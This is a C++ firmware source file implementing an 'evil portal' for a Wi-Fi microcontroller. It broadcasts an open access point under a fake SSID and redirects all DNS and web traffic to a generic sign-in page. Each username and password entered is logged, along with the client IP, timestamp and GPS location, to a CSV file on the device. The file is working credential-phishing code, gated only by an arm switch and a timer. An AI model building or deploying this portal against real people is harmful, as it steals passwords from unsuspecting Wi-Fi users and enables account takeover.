#include "evil_portal.h"
#include "config.h"
#include "tx_arm.h"
#include "rtc_clock.h"
#include "gps_module.h"

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LittleFS.h>

namespace {
bool g_active = false;
uint32_t g_deadline = 0;
DNSServer *g_dns = nullptr;
WebServer *g_server = nullptr;

// Generic sign-in page: no real company/brand is referenced.
const char PAGE[] PROGMEM = R"HTML(<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Network sign-in</title>
<style>
body{font-family:sans-serif;background:#f2f2f2;display:flex;justify-content:center;padding-top:60px;margin:0}
.card{background:#fff;border-radius:8px;padding:24px;box-shadow:0 1px 4px rgba(0,0,0,.2);width:280px}
h2{margin-top:0;font-size:18px}
input{width:100%;padding:8px;margin:6px 0;box-sizing:border-box}
button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:0;border-radius:4px}
</style></head><body><div class="card">
<h2>Sign in to continue</h2>
<p style="font-size:13px;color:#555">This network requires authentication.</p>
<form method="POST" action="/submit">
<input name="username" placeholder="Username" autocomplete="off">
<input name="password" type="password" placeholder="Password" autocomplete="off">
<button type="submit">Sign in</button>
</form></div></body></html>)HTML";

void ensureLogFile() {
    if (!LittleFS.exists(LOG_DIR)) LittleFS.mkdir(LOG_DIR);
    if (!LittleFS.exists(EVILPORTAL_LOG_FILE)) {
        File f = LittleFS.open(EVILPORTAL_LOG_FILE, FILE_WRITE);
        if (f) {
            f.println("timestamp,gps,client_ip,username,password");
            f.close();
        }
    }
}

void handleRoot() {
    g_server->send_P(200, "text/html", PAGE);
}

void handleSubmit() {
    String user = g_server->arg("username");
    String pass = g_server->arg("password");
    String ip = g_server->client().remoteIP().toString();

    File f = LittleFS.open(EVILPORTAL_LOG_FILE, FILE_APPEND);
    if (f) {
        f.printf("%s,%s,%s,%s,%s\n",
                 RtcClock::isoTimestamp().c_str(), GpsModule::fixString().c_str(),
                 ip.c_str(), user.c_str(), pass.c_str());
        f.close();
    }

    g_server->send(200, "text/html",
        "<html><body style='font-family:sans-serif'><p>Thanks, you're connected.</p></body></html>");
}
} // namespace

namespace EvilPortal {

bool start(const String &fakeSsid, uint32_t maxDurationMs) {
    if (!TxArm::isArmed()) return false;
    if (g_active) return false;

    ensureLogFile();

    WiFi.softAP(fakeSsid.c_str()); // open network, matches how most captive portals present
    IPAddress apIP = WiFi.softAPIP();

    g_dns = new DNSServer();
    g_dns->start(53, "*", apIP);

    g_server = new WebServer(80);
    g_server->on("/", handleRoot);
    g_server->on("/submit", HTTP_POST, handleSubmit);
    g_server->onNotFound(handleRoot); // any unknown path resolves to the sign-in page
    g_server->begin();

    g_deadline = millis() + maxDurationMs;
    g_active = true;
    return true;
}

void stop() {
    if (!g_active) return;
    g_server->stop();
    delete g_server;
    g_server = nullptr;
    g_dns->stop();
    delete g_dns;
    g_dns = nullptr;
    g_active = false;
}

void loop() {
    if (!g_active) return;
    g_dns->processNextRequest();
    g_server->handleClient();
    if ((int32_t)(millis() - g_deadline) > 0) stop();
}

bool active() { return g_active; }
String logPath() { return String(EVILPORTAL_LOG_FILE); }

} // namespace EvilPortal
